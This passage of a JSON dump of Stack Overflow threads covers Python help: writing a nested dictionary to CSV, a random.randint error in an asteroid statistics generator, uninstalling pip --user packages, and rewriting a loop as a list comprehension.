["python", "csv", "dictionary"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427921851, "post_id": 29400631, "comment_id": 46977153, "body": "dicts don&#39;t have order so you are in trouble straight away"}, {"owner": {"reputation": 216, "user_id": 3888543, "user_type": "registered", "accept_rate": 45, "profile_image": "https://i.stack.imgur.com/nmFGf.jpg?s=128&g=1", "display_name": "Sarith Subramaniam", "link": "https://stackoverflow.com/users/3888543/sarith-subramaniam"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427922223, "post_id": 29400631, "comment_id": 46977346, "body": "@PadraicCunningham agreed. However, his keys seem to follow a lexographic order. So, he could still make it work by sorting dw.keys() and then iterating over that."}], "answers": [{"comments": [{"owner": {"reputation": 2601, "user_id": 1988084, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZvqeO.png?s=128&g=1", "display_name": "hexerei software", "link": "https://stackoverflow.com/users/1988084/hexerei-software"}, "edited": false, "score": 0, "creation_date": 1427925524, "post_id": 29400750, "comment_id": 46978753, "body": "it is not necessary to sort years, if you would be using DictWriter as suggested in other Answers"}, {"owner": {"reputation": 5257, "user_id": 3946766, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a53461a9198ab5365f72c744a83ff3b?s=128&d=identicon&r=PG", "display_name": "matsjoyce", "link": "https://stackoverflow.com/users/3946766/matsjoyce"}, "reply_to_user": {"reputation": 2601, "user_id": 1988084, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZvqeO.png?s=128&g=1", "display_name": "hexerei software", "link": "https://stackoverflow.com/users/1988084/hexerei-software"}, "edited": false, "score": 0, "creation_date": 1427963078, "post_id": 29400750, "comment_id": 46990403, "body": "@hexereisoftware Yeah, but that would just be copying now."}], "tags": [], "owner": {"reputation": 5257, "user_id": 3946766, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a53461a9198ab5365f72c744a83ff3b?s=128&d=identicon&r=PG", "display_name": "matsjoyce", "link": "https://stackoverflow.com/users/3946766/matsjoyce"}, "is_accepted": true, "score": 5, "last_activity_date": 1427922078, "creation_date": 1427922078, "answer_id": 29400750, "question_id": 29400631, "link": "https://stackoverflow.com/questions/29400631/python-writing-nested-dictionary-to-csv/29400750#29400750", "title": "Python: Writing Nested Dictionary to CSV", "body": "<p>Change:</p>\n\n<pre><code>w.writerow([key, [dw[key][year] for year in years]])\n</code></pre>\n\n<p>To:</p>\n\n<pre><code>w.writerow([key] + [dw[key][year] for year in years])\n</code></pre>\n\n<p>Otherwise, you try to write something like <code>[orgname1, [2, 1, 1]]</code> to the csv, while you mean <code>[orgname1, 2, 1, 1]</code>.</p>\n\n<p>As Padraic mentioned, you may want to change <code>years = dw.values()[0].keys()</code> to <code>years = sorted(dw.values()[0].keys())</code> or <code>years = fields[1:]</code> to avoid random behaviour.</p>\n"}, {"comments": [{"owner": {"reputation": 2601, "user_id": 1988084, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZvqeO.png?s=128&g=1", "display_name": "hexerei software", "link": "https://stackoverflow.com/users/1988084/hexerei-software"}, "edited": false, "score": 1, "creation_date": 1427926329, "post_id": 29400800, "comment_id": 46979039, "body": "you deserve the best comment actually, because you where the first complete solution and i like the way you used the the dicts update function. i adapted that in my answer in a separate function to keep it a one liner afterwards. so my answer is pretty much yours, changed to file output and added headers :)"}], "tags": [], "owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "is_accepted": false, "score": 18, "last_activity_date": 1427922244, "creation_date": 1427922244, "answer_id": 29400800, "question_id": 29400631, "link": "https://stackoverflow.com/questions/29400631/python-writing-nested-dictionary-to-csv/29400800#29400800", "title": "Python: Writing Nested Dictionary to CSV", "body": "<p>This looks like a job for <a href=\"https://docs.python.org/2/library/csv.html#csv.DictWriter\"><code>DictWriter</code></a>:</p>\n\n<pre><code>import csv\nimport itertools\nimport sys\n\nfields = [ 'org', '2015', '2014', '2013' ]\ndw     = { 'orgname1': { '2015' : 2, '2014' : 1, '2013' : 1 },\n           'orgname2': { '2015' : 1, '2014' : 2, '2013' : 3 },\n           'orgname3': { '2015' : 1, '2014' : 3, '2013' : 1 }\n        }\n\nw = csv.DictWriter( sys.stdout, fields )\nfor key,val in sorted(dw.items()):\n    row = {'org': key}\n    row.update(val)\n    w.writerow(row)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2601, "user_id": 1988084, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZvqeO.png?s=128&g=1", "display_name": "hexerei software", "link": "https://stackoverflow.com/users/1988084/hexerei-software"}, "edited": false, "score": 0, "creation_date": 1427926032, "post_id": 29400823, "comment_id": 46978941, "body": "i like your answer best, straight forward :) you could consider sorting <code>dw</code> by its keys since in your output the order of the orgnames has changed from input. using <code>sorted(dw.items())</code>  fixes this"}, {"owner": {"reputation": 2166, "user_id": 2734863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b1edbcba419dd480d29a80ea3c9674c4?s=128&d=identicon&r=PG", "display_name": "Frikster", "link": "https://stackoverflow.com/users/2734863/frikster"}, "edited": false, "score": 3, "creation_date": 1501042275, "post_id": 29400823, "comment_id": 77596600, "body": "Dear Python 3 users who don&#39;t want to embarrass themselves spending hours on this like I just did when all you have to do is simply switch <code>open(&quot;test_output.csv&quot;, &quot;wb&quot;)</code> for <code>open(&quot;test_output.csv&quot;, &quot;w&quot;, newline=&#39;&#39;)</code> and the above solution will work flawlessly. You&#39;ll get a <code>a bytes-like object is required, not &#39;str&#39; when writing to a file&#39; </code> otherwise. Don&#39;t be a nana and try to encode your whole dictionary into <code>ascii</code> like me."}, {"owner": {"reputation": 152, "user_id": 13351822, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AOh14GilwEiHJNNWHQwQvoFhvjdKIXMQ3jv7AAUZUZ4Dlg=k-s128", "display_name": "Deep Dalsania", "link": "https://stackoverflow.com/users/13351822/deep-dalsania"}, "edited": false, "score": 0, "creation_date": 1590746409, "post_id": 29400823, "comment_id": 109803334, "body": "If my value of any key is 0 then I got key as value like orgname1,orgname1,1,1 if 2015: 0 is for orgname1. So any solution for this. @\u0141ukasz Rogalski"}], "tags": [], "owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "is_accepted": false, "score": 9, "last_activity_date": 1427922314, "creation_date": 1427922314, "answer_id": 29400823, "question_id": 29400631, "link": "https://stackoverflow.com/questions/29400631/python-writing-nested-dictionary-to-csv/29400823#29400823", "title": "Python: Writing Nested Dictionary to CSV", "body": "<p>Alternative implementation using <a href=\"https://docs.python.org/2/library/csv.html#csv.DictWriter\" rel=\"noreferrer\">DictWriter</a> and with headers</p>\n\n<pre><code>import csv\nimport itertools\n\nfields = [ 'org', '2015', '2014', '2013' ]\ndw     = { 'orgname1': { '2015' : 2, '2014' : 1, '2013' : 1 },\n           'orgname2': { '2015' : 1, '2014' : 2, '2013' : 3 },\n           'orgname3': { '2015' : 1, '2014' : 3, '2013' : 1 }\n        }\n\nwith open(\"test_output.csv\", \"wb\") as f:\n    w = csv.DictWriter(f, fields)\n    w.writeheader()\n    for k in dw:\n        w.writerow({field: dw[k].get(field) or k for field in fields})\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>org,2015,2014,2013\norgname1,2,1,1\norgname3,1,3,1\norgname2,1,2,3\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2601, "user_id": 1988084, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZvqeO.png?s=128&g=1", "display_name": "hexerei software", "link": "https://stackoverflow.com/users/1988084/hexerei-software"}, "is_accepted": false, "score": 2, "last_activity_date": 1427925831, "last_edit_date": 1427925831, "creation_date": 1427925427, "answer_id": 29401559, "question_id": 29400631, "link": "https://stackoverflow.com/questions/29400631/python-writing-nested-dictionary-to-csv/29401559#29401559", "title": "Python: Writing Nested Dictionary to CSV", "body": "<p>Using DictWriter there is no need in sorting the fields in advance, since <code>w.writerow()</code> will assure the correct order. But it does make sense to sort the items themselves.</p>\n\n<p>So putting together all the above suggestions and picking the best of each, i would come up with following code:</p>\n\n<pre><code>import csv\nimport itertools\n\ndef mergedict(a,b):\n    a.update(b)\n    return a\n\nfields = [ 'org', '2015', '2014', '2013' ]\ndw     = { 'orgname1': { '2015' : 2, '2014' : 1, '2013' : 1 },\n           'orgname2': { '2015' : 1, '2014' : 2, '2013' : 3 },\n           'orgname3': { '2015' : 1, '2014' : 3, '2013' : 1 }\n        }\n\nwith open(\"test_output.csv\", \"wb\") as f:\n    w = csv.DictWriter( f, fields )\n    w.writeheader()\n    for k,d in sorted(dw.items()):\n        w.writerow(mergedict({'org': k},d))\n</code></pre>\n\n<p>i added a tiny <code>mergedict()</code> function that makes it a one liner further down.</p>\n"}, {"comments": [{"owner": {"reputation": 176, "user_id": 6052048, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/64f67eef4b540c79d1323daf09168ecf?s=128&d=identicon&r=PG&f=1", "display_name": "blackswan", "link": "https://stackoverflow.com/users/6052048/blackswan"}, "edited": false, "score": 0, "creation_date": 1610315920, "post_id": 61496252, "comment_id": 116087993, "body": "Missing parentheses in the last line to make it work"}], "tags": [], "owner": {"reputation": 11, "user_id": 6823915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82dd707732ea4b1a2814aa39ed4d6cab?s=128&d=identicon&r=PG&f=1", "display_name": "squirrelnuts", "link": "https://stackoverflow.com/users/6823915/squirrelnuts"}, "is_accepted": false, "score": 1, "last_activity_date": 1588144863, "creation_date": 1588144863, "answer_id": 61496252, "question_id": 29400631, "link": "https://stackoverflow.com/questions/29400631/python-writing-nested-dictionary-to-csv/61496252#61496252", "title": "Python: Writing Nested Dictionary to CSV", "body": "<p>I think this could be an easier way:</p>\n\n<pre><code>import csv\n\nfields = [ 'org', '2015', '2014', '2013' ]\ndw     = { 'orgname1': { '2015' : 2, '2014' : 1, '2013' : 1 },\n           'orgname2': { '2015' : 1, '2014' : 2, '2013' : 3 },\n           'orgname3': { '2015' : 1, '2014' : 3, '2013' : 1 }\n        }\n\nwith open(\"test_output.csv\", \"w\") as csv_file:\n  csvwriter = csv.writer(csv_file)\n  csvwriter.writerow(['org', '2015', '2014', '2013'])\n\n  for org in dw:\n     csvwriter.writerow(org, dw[org]['2015'], dw[org]['2014'], dw[org]['2013'])\n</code></pre>\n"}], "owner": {"reputation": 427, "user_id": 1264243, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/fb22e7cc3d1d85d09c68886e680c86ea?s=128&d=identicon&r=PG", "display_name": "Zack", "link": "https://stackoverflow.com/users/1264243/zack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 26166, "favorite_count": 10, "accepted_answer_id": 29400750, "answer_count": 5, "score": 16, "last_activity_date": 1588144863, "creation_date": 1427921705, "last_edit_date": 1429616487, "question_id": 29400631, "link": "https://stackoverflow.com/questions/29400631/python-writing-nested-dictionary-to-csv", "title": "Python: Writing Nested Dictionary to CSV", "body": "<p>I'm trying to write a nested dictionary to a .csv file. Here is is a simple example:</p>\n\n<pre><code>import csv\nimport itertools\n\nfields = [ 'org', '2015', '2014', '2013' ]\ndw     = { 'orgname1': { '2015' : 2, '2014' : 1, '2013' : 1 },\n           'orgname2': { '2015' : 1, '2014' : 2, '2013' : 3 },\n           'orgname3': { '2015' : 1, '2014' : 3, '2013' : 1 }\n        }\n\nwith open(\"test_output.csv\", \"wb\") as f:\n    w = csv.writer( f )\n    years = dw.values()[0].keys()\n    for key in dw.keys():\n        w.writerow([key, [dw[key][year] for year in years]])\n</code></pre>\n\n<p>This gets me a table with two columns: the first contains <code>orgname</code>; the second contains [2, 1, 1] (or the corresponding values from the sub-dictionary). I'd like a table with four columns: one for <code>orgname</code> and then three for the corresponding list elements.</p>\n"}, {"tags": ["python", "python-3.x", "random", "syntax", "syntax-error"], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "edited": false, "score": 0, "creation_date": 1427928366, "post_id": 29401486, "comment_id": 46979816, "body": "I tried your solution but I got this error: Traceback (most recent call last):   File &quot;&lt;pyshell#5&gt;&quot;, line 1, in &lt;module&gt;     pick(1)   File &quot;/Users/James/Desktop/Asteroid Name Generator.py&quot;, line 4, in pick     print(&quot;&quot;.join([random.choice(string.ascii_uppercase) for i in range(3)])+&quot;-&quot;+&quot;&quot;.join([random.choice(string.digits) for i in range(3)])+&quot; &quot;+&quot;&quot;.join([random.choice([&#39;A Type (Small)&#39;,&#39;B Type (Medium)&#39;,&#39;C Type (large)&#39;,&#39;D Type (Huge)&#39;])])+&quot; &quot;+&quot;&quot;.join([float(random.randint(1, 39))/100.0])) TypeError: sequence item 0: expected str instance, float found"}, {"owner": {"reputation": 1257, "user_id": 4637583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/532a2d09f5168f19818a1e8cf2ebaabd?s=128&d=identicon&r=PG&f=1", "display_name": "Alan Hoover", "link": "https://stackoverflow.com/users/4637583/alan-hoover"}, "reply_to_user": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "edited": false, "score": 0, "creation_date": 1428007561, "post_id": 29401486, "comment_id": 47015842, "body": "@user2368535 just need to convert that back to a string.  I updated my answer and used some string formatting to de-clutter things a little."}], "tags": [], "owner": {"reputation": 1257, "user_id": 4637583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/532a2d09f5168f19818a1e8cf2ebaabd?s=128&d=identicon&r=PG&f=1", "display_name": "Alan Hoover", "link": "https://stackoverflow.com/users/4637583/alan-hoover"}, "is_accepted": false, "score": 0, "last_activity_date": 1428007442, "last_edit_date": 1428007442, "creation_date": 1427925091, "answer_id": 29401486, "question_id": 29400566, "link": "https://stackoverflow.com/questions/29400566/python-3-4-3-asteroid-statistic-generator-errors/29401486#29401486", "title": "Python 3.4.3 Asteroid Statistic Generator Errors", "body": "<p>You are giving random.randint() floating point parameters.  Try changing:</p>\n\n<pre><code>random.randint(0.01, 0.39)\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>float(random.randint(1, 39))/100.0\n</code></pre>\n\n<p>edit :\nOkay it needs that converted back to a string, let's use string formatting to make things a little prettier:</p>\n\n<pre><code>\"Surface Gravity: %f.2 m/s2\"%(float(random.randint(1, 39))/100.0)\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 2368535, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/91a0e45d5fd913de7dafc47e4f1a621c?s=128&d=identicon&r=PG", "display_name": "user2368535", "link": "https://stackoverflow.com/users/2368535/user2368535"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 126, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1428007442, "creation_date": 1427921447, "last_edit_date": 1427928479, "question_id": 29400566, "link": "https://stackoverflow.com/questions/29400566/python-3-4-3-asteroid-statistic-generator-errors", "title": "Python 3.4.3 Asteroid Statistic Generator Errors", "body": "<p>I am working on a program in python 3.4.3 that generates random asteroid statistics. I want it to generate a random name, type, and surface gravity.</p>\n\n<p>Examples:</p>\n\n<p>MUS-983 A Type Surface Gravity: 0.31 m/s\u00b2 </p>\n\n<p>The code I have so far is:\n<code>import string, random\ndef pick(num):\n    for j in range(num):\n        print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)])+\" \"+\"\".join([random.choice(['A Type','B Type','C Type'])])+\"Surface Gravity: \"+\"\".join([random.randint(0.01, 0.39)]))</code></p>\n\n<p>Which has worked well until i put in the part about Surface gravity on the end. Now I have a few questions. First is when I run the program i get a error: </p>\n\n<p><code>Traceback (most recent call last):\n  File \"&lt;pyshell#5&gt;\", line 1, in &lt;module&gt;\n    pick(1)\n  File \"/Users/James/Desktop/Asteroid Name Generator.py\", line 4, in pick\n    print(\"\".join([random.choice(string.ascii_uppercase) for i in range(3)])+\"-\"+\"\".join([random.choice(string.digits) for i in range(3)])+\" \"+\"\".join([random.choice(['A Type','B Type','C Type'])])+\" \"+\"\".join([random.randint(0.01, 0.39)]))\n  File \"/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/random.py\", line 218, in randint\n    return self.randrange(a, b+1)\n  File \"/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/random.py\", line 182, in randrange\n    raise ValueError(\"non-integer arg 1 for randrange()\")\nValueError: non-integer arg 1 for randrange()</code> </p>\n\n<p>The second question is how to integrate the 'm/s\u00b2' title in front of the randomly generated surface gravity decimal. </p>\n\n<p>Thank you! </p>\n"}, {"tags": ["python", "pip"], "comments": [{"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1427921017, "post_id": 29400417, "comment_id": 46976686, "body": "First, you should <b>really</b> upgrade pip - <code>pip install -U pip --user</code>."}, {"owner": {"reputation": 10366, "user_id": 236195, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/53fd77df3990f126c69fb6ec4e0ea6de?s=128&d=identicon&r=PG", "display_name": "frnhr", "link": "https://stackoverflow.com/users/236195/frnhr"}, "edited": false, "score": 0, "creation_date": 1427921438, "post_id": 29400417, "comment_id": 46976929, "body": "Nope, but you can probably get what you want with virtualenv. By default (in newer versions) it will not inherit anything installed systemwide, so you can install things you need in it."}], "answers": [{"tags": [], "owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "is_accepted": true, "score": 3, "last_activity_date": 1427921163, "creation_date": 1427921163, "answer_id": 29400475, "question_id": 29400417, "link": "https://stackoverflow.com/questions/29400417/is-there-an-uninstall-equivalent-to-pip-install-user-package/29400475#29400475", "title": "is there an uninstall equivalent to &quot;pip install --user &lt;package&gt;&quot;?", "body": "<p>This was a known bug in pip</p>\n\n<p>Ref : <a href=\"https://github.com/pypa/pip/issues/2094\" rel=\"nofollow\">https://github.com/pypa/pip/issues/2094</a></p>\n\n<blockquote>\n  <p>As pip uninstall does not have --user option unlike pip install the question is if there even exists a way to uninstall package installed with pip install --user?</p>\n</blockquote>\n\n<p>It is now cleared with a note</p>\n\n<blockquote>\n  <p>The packages mentioned in the ticket started working after they offered Wheel-based packages. </p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 81, "user_id": 1612073, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5eu54.jpg?s=128&g=1", "display_name": "Dragos Custura", "link": "https://stackoverflow.com/users/1612073/dragos-custura"}, "is_accepted": false, "score": 1, "last_activity_date": 1584947304, "creation_date": 1584947304, "answer_id": 60809207, "question_id": 29400417, "link": "https://stackoverflow.com/questions/29400417/is-there-an-uninstall-equivalent-to-pip-install-user-package/60809207#60809207", "title": "is there an uninstall equivalent to &quot;pip install --user &lt;package&gt;&quot;?", "body": "<p>I have found that upgrading the package first will let you uninstall the package that you installed with <em>--user</em> option. For my case was elevated:</p>\n\n<p>I have installed with command:</p>\n\n<pre><code>pip3 install --user elevate\n</code></pre>\n\n<p>When i try to uninstall i recieve the skip info:</p>\n\n<pre><code>Skipping elevate as it is not installed.\n</code></pre>\n\n<p>After many unsuccessfull commands i have found that i need to update the package first with:</p>\n\n<pre><code>pip3 install --user --upgrade elevated\n</code></pre>\n\n<p>Then i was able to successfully uninstall the elevate package:</p>\n\n<pre><code>pip3 uninstall elevated\n</code></pre>\n"}], "owner": {"reputation": 357, "user_id": 509882, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/f45f1eaa5c8b481856508e071bd341fd?s=128&d=identicon&r=PG", "display_name": "Arthur", "link": "https://stackoverflow.com/users/509882/arthur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1688, "favorite_count": 0, "accepted_answer_id": 29400475, "answer_count": 2, "score": 5, "last_activity_date": 1584947304, "creation_date": 1427920957, "question_id": 29400417, "link": "https://stackoverflow.com/questions/29400417/is-there-an-uninstall-equivalent-to-pip-install-user-package", "title": "is there an uninstall equivalent to &quot;pip install --user &lt;package&gt;&quot;?", "body": "<p>Our sysadmin has installed a package, so I can remove my local copy. I'd like to say</p>\n\n<pre><code>pip uninstall --user &lt;package&gt;\n</code></pre>\n\n<p>but <code>pip uninstall</code> does not support <code>--user</code>. (At least <code>pip 1.5.4</code> on Linux doesn't.)\nIs there an easy way to do this by hand, i.e., delete the directory that contains the package? </p>\n"}, {"tags": ["python", "list", "dictionary", "dictionary-comprehension"], "comments": [{"owner": {"reputation": 10366, "user_id": 236195, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/53fd77df3990f126c69fb6ec4e0ea6de?s=128&d=identicon&r=PG", "display_name": "frnhr", "link": "https://stackoverflow.com/users/236195/frnhr"}, "edited": false, "score": 1, "creation_date": 1427921060, "post_id": 29400346, "comment_id": 46976703, "body": "The <code>continue</code> is redundant"}, {"owner": {"reputation": 288763, "user_id": 487339, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wbe4o.png?s=128&g=1", "display_name": "DSM", "link": "https://stackoverflow.com/users/487339/dsm"}, "edited": false, "score": 0, "creation_date": 1427921063, "post_id": 29400346, "comment_id": 46976707, "body": "Aside: have you heard of <a href=\"https://docs.python.org/3.4/library/csv.html#csv.DictReader\" rel=\"nofollow noreferrer\"><code>csv.DictReader</code></a>?"}, {"owner": {"reputation": 397, "user_id": 1442916, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/74248bdf5b02584e72315e7be2e745b1?s=128&d=identicon&r=PG", "display_name": "Daniel Dow", "link": "https://stackoverflow.com/users/1442916/daniel-dow"}, "edited": false, "score": 0, "creation_date": 1427921250, "post_id": 29400346, "comment_id": 46976819, "body": "Hello Matt.  I didn&#39;t try anything that gave me anything other than a syntax error so I didn&#39;t keep any of it to paste here, sorry."}, {"owner": {"reputation": 397, "user_id": 1442916, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/74248bdf5b02584e72315e7be2e745b1?s=128&d=identicon&r=PG", "display_name": "Daniel Dow", "link": "https://stackoverflow.com/users/1442916/daniel-dow"}, "edited": false, "score": 0, "creation_date": 1427925499, "post_id": 29400346, "comment_id": 46978740, "body": "Hello DSM.  No, I have not heard of that, but I&#39;m not allowed to actually import anything.  I&#39;m supposed to write this using only built-ins."}, {"owner": {"reputation": 397, "user_id": 1442916, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/74248bdf5b02584e72315e7be2e745b1?s=128&d=identicon&r=PG", "display_name": "Daniel Dow", "link": "https://stackoverflow.com/users/1442916/daniel-dow"}, "edited": false, "score": 0, "creation_date": 1427925554, "post_id": 29400346, "comment_id": 46978759, "body": "Padriac Cunningham, sorry.  I should have included the first line of the def.     def dicts(self, value):"}, {"owner": {"reputation": 397, "user_id": 1442916, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/74248bdf5b02584e72315e7be2e745b1?s=128&d=identicon&r=PG", "display_name": "Daniel Dow", "link": "https://stackoverflow.com/users/1442916/daniel-dow"}, "edited": false, "score": 0, "creation_date": 1427925604, "post_id": 29400346, "comment_id": 46978785, "body": "fnrhr.  Thanks, I see that now."}], "answers": [{"tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 2, "last_activity_date": 1427920948, "creation_date": 1427920948, "answer_id": 29400411, "question_id": 29400346, "link": "https://stackoverflow.com/questions/29400346/looking-for-a-python-dict-comprehension-from-a-loop-i-wrote/29400411#29400411", "title": "Looking for a Python dict comprehension from a loop I wrote", "body": "<p>Try this:</p>\n\n<pre><code>return [dict(zip(self.keys, line)) for line in self.data if value in line]\n</code></pre>\n\n<p>This would actually be a list comprehension, since we're building a list.</p>\n"}, {"tags": [], "owner": {"reputation": 5257, "user_id": 3946766, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a53461a9198ab5365f72c744a83ff3b?s=128&d=identicon&r=PG", "display_name": "matsjoyce", "link": "https://stackoverflow.com/users/3946766/matsjoyce"}, "is_accepted": false, "score": 1, "last_activity_date": 1427921491, "last_edit_date": 1427921491, "creation_date": 1427921058, "answer_id": 29400448, "question_id": 29400346, "link": "https://stackoverflow.com/questions/29400346/looking-for-a-python-dict-comprehension-from-a-loop-i-wrote/29400448#29400448", "title": "Looking for a Python dict comprehension from a loop I wrote", "body": "<p>First of all, you can simplify your code to:</p>\n\n<pre><code>results = []\nfor line in self.data:\n    if value in line:\n        item = dict(zip(self.keys, line))\n        results.append(item)\nreturn results\n</code></pre>\n\n<p>This shows your looping is <code>for line in self.data</code>, your value is <code>dict(zip(self.keys, line))</code> and your condition is <code>value in line</code>, so you put the value, then loop, then conditional - `[value loop conditional]. Your list comprehension becomes:</p>\n\n<pre><code>result = [dict(zip(self.keys, line)) for line in self.data if value in line]\nreturn result\n</code></pre>\n\n<p>You can eliminate <code>result</code>, to give you:</p>\n\n<pre><code>return [dict(zip(self.keys, line)) for line in self.data if value in line]\n</code></pre>\n\n<p>However, as DSM points out, you can simply do:</p>\n\n<pre><code>import csv\nwith open(\"...\") as f:\n    return list(csv.DictReader(f, fieldnames=next(f).strip().split(), dialect=\"excel_tab\"))\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 768, "user_id": 4739732, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sg7P9.jpg?s=128&g=1", "display_name": "agamagarwal", "link": "https://stackoverflow.com/users/4739732/agamagarwal"}, "is_accepted": true, "score": 1, "last_activity_date": 1427921179, "creation_date": 1427921179, "answer_id": 29400478, "question_id": 29400346, "link": "https://stackoverflow.com/questions/29400346/looking-for-a-python-dict-comprehension-from-a-loop-i-wrote/29400478#29400478", "title": "Looking for a Python dict comprehension from a loop I wrote", "body": "<p>Based on what I can understand from the question, this should work</p>\n\n<pre><code>result=[dict(zip(self.keys, line)) for line in self.data if value in line]\n</code></pre>\n"}], "owner": {"reputation": 397, "user_id": 1442916, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/74248bdf5b02584e72315e7be2e745b1?s=128&d=identicon&r=PG", "display_name": "Daniel Dow", "link": "https://stackoverflow.com/users/1442916/daniel-dow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 219, "favorite_count": 0, "accepted_answer_id": 29400478, "answer_count": 3, "score": 0, "last_activity_date": 1427921491, "creation_date": 1427920732, "question_id": 29400346, "link": "https://stackoverflow.com/questions/29400346/looking-for-a-python-dict-comprehension-from-a-loop-i-wrote", "title": "Looking for a Python dict comprehension from a loop I wrote", "body": "<p>I'm new to Python and trying to write a dictionary comprehension from this for loop:</p>\n\n<pre><code>    results = []\n    for line in self.data:\n        if value in line:\n            item = dict(zip(self.keys, line))\n            results.append(item)\n        continue\n    return results\n</code></pre>\n\n<p>self.keys is a list self.data is a list of lists of values that belong to those keys.  Basically, I have a list of values from the top of a tab-delimited text file (the keys) and then a bunch of rows of for the values of the actual items represented in the file:</p>\n\n<pre><code>[scene, take, camera]\n[12, 1, A]\n[12, 1, B]\n[12, 2, A]\n[12, 2, B]\n</code></pre>\n\n<p>etc...</p>\n\n<p>I want, </p>\n\n<pre><code>{scene:12, take:1, camera:A}\n</code></pre>\n\n<p>The code I have works, but I'm trying to learn so I'm wondering if someone can teach me how to write that as a comprehension.</p>\n\n<p>Any help would be appreciated!</p>\n\n<p>Thanks,</p>\n\n<p>Dan</p>\n"}, {"tags": ["python", "macos", "qt", "pyqt4"], "comments": [{"owner": {"reputation": 97291, "user_id": 984421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l9J30.png?s=128&g=1", "display_name": "ekhumoro", "link": 